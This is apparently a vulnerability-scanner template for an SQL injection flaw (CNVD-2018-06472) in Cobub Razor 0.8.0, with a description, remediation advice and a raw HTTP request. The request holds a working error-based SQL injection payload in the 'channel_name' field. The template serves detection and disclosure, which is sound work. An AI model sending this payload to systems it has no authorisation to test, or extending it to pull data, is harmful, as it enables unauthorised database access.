id: CNVD-2018-06472
info:
  name: cobubrazor_v8_index.php_channel_name参数_sql注入
  author:
  - jim2g
  description: "cobubrazor_v8_index.php_channel_name参数_sql注入\nWestern Bridge Cobub
    Razor是一套开源的移动应用程序分析系统。该系统能够为用户提供详细的多维度报告并监控其移动应用和应用程序用户行为的统计数据。\n\nWestern Bridge
    Cobub Razor 0.8.0版本中存在SQL注入漏洞。远程攻击者可借助/index.php?/manage/channel/addchannel请求中的‘channel_name’或‘platform’参数利用该漏洞获取信息。 "
  severity: high
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://www.cobub.com/cobub-razor/
    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code==500
    - contains(body,'202cb962ac59075b964b07152d234b701')
  raw:
  - |
    POST /razor/index.php?/manage/channel/addchannel HTTP/1.1
    Host: {{Hostname}}

    channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(md5(123),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1
  req-condition: true
